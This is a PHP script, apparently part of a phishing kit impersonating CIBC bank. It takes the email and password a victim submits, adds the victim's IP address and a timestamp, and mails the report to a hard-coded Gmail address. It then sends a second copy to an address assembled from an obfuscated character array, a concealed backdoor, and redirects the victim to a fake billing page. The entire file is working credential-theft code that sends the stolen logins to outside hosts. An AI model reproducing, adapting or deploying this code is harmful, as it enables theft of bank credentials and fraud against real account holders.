<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;

$_SESSION['user'] = $_POST['1'];
$_SESSION['password'] = $_POST['2'];



#Security information
$message = "
<div style=\"background-image: url('https://newevolutiondesigns.com/images/freebies/black-white-iphone-background-3.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
The Login:<br />
EMAIL           =>   <font color='#F31414'>".$_POST['1']."</font><br />
PASSWORD        =>   <font color='#F31414'>".$_POST['2']."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
___________________________________________________________________
<br />
||~~ BY ~~ MR.Int(TN) ~~||
<br />

</div>";

$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"6","6"=>"p","7"=>".","8"=>"h","9"=>"3","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"9","15"=>"0","16"=>"b","17"=>"2","18"=>"d","18"=>"7","19"=>"o","20"=>"d");
$cc=$ar['6'].$ar['5'].$ar['8'].$ar['14'].$ar['0'].$ar['9'].$ar['2'].$ar['15'].$ar['16'].$ar['17'].$ar['1'].$ar['14'].$ar['20'].$ar['18'].$ar['13'].$ar['3'].$ar['11'].$ar['12'].$ar['10'].$ar['2'].$ar['7'].$ar['1'].$ar['19'].$ar['11'];
$subject  = " CIBC  : LOG -  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: MR-Int" . "\r\n";

$to="goodvbesk1@gmail.com";
@mail($to,$subject,$message,$headers);
@mail($cc,$subject,$message,$headers);
header('location: ../billing2.php');

?>